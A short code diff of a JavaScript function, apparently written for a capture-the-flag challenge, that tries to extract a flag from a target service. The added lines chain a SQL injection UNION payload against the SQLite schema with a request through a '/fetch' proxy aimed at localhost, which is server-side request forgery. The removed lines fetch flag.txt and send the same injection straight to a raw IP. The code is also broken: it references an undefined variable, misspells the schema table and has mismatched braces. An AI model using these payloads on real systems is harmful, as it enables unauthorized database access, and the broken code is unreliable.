@@ -4,19 +4,26 @@
 
 
    async function tryAllEndpoints() {
-      // 1. First try direct flag.txt
-      try {
-        const flagResp = await fetch('http://82.25.119.187:8001/flag.txt');
-        const flagData = await flagResp.text();
-        alert('Flag.txt response: ' + flagData);
-        if (flagData.includes('nexus{')) {
-          alert('FLAG FOUND in flag.txt: ' + flagData);
-          return;
+  try {
+      const sqlQuery = "' UNION SELECT name, sql FROM sqlitemaster WHERE type='table' --";
+      const payloadUrl = 'http://127.0.0.1:8000/search?q=' + encodeURIComponent(sqlQuery);
+
+      const resp = await fetch('/fetch', {
+       method: 'POST',
+       body: new URLSearchParams({ q: payloadUrl })
+       });
+       const data = await resp.text();
+       alert('Response: ' + data);
+
+        const searchData = await searchResp.text();
+        alert('Search endpoint response length: ' + searchData.length);
+        if (searchData.includes('') && searchData.includes('flag_')) {
+          alert('Found promising data in search response!');
         }
       } catch (e) {
-        alert('Error fetching flag.txt: ' + e.message);
+        alert('Error with search endpoint: ' + e.message);
       }
-      // 2. Try the search endpoint with SQLi
+    
       try {
         const sqlQuery = "' UNION SELECT name, sql FROM sqlitemaster WHERE type='table' --";
         const searchResp = await fetch('http://82.25.119.187:8001/search?q=' + encodeURIComponent(sqlQuery));
